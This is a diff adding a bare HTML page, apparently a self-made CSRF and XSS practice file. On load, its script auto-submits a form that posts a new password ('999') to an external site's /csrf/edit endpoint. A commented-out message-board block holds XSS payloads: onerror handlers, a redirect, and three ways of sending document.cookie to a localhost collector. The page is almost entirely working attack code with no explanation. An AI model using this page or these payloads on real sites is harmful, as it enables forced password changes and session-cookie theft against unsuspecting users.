@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <form class="csrf" action="https://www.zhengbeining.com/csrf/edit" method="post" style="display: block;">
+        <input type="text" name="password" value="999" />
+        <input type="submit">
+    </form>
+    <!-- <iframe name="iframe" style="display: none;"></iframe> -->
+
+    <script>
+        var el = document.getElementsByClassName("csrf")[0]
+        el.submit()
+    </script>
+
+
+    <!-- <div>
+        <h1>留言板</h1>
+        <img src="xxx" onerror="alert('Bingo!')" alt="">
+        <ul>
+            <li>
+                你好啊
+            </li>
+            <li>
+                <img src="不存在的地址1" onerror="window.location.href='http://www.github.com';" alt="">
+            </li>
+            <li>
+                <script>window.location.href = "http://localhost:3000/js_xss?" + document.cookie;</script>
+            </li>
+            <li>
+                <script>
+                    var imgEl = new Image();
+                    imgEl.src = "http://localhost:3000/img_xss?" + document.cookie;
+                    imgEl.style.display = 'none';
+                    document.body.appendChild(imgEl);
+                </script>
+            </li>
+            <li>
+                <script>
+                    var scriptEl = document.createElement("script");
+                    scriptEl.type = "text/javascript";
+                    scriptEl.src = "http://localhost:3000/js_xss?" + document.cookie;
+                    document.body.appendChild(scriptEl);
+                </script>
+            </li>
+        </ul>
+    </div> -->
+</body>
+
+</html>
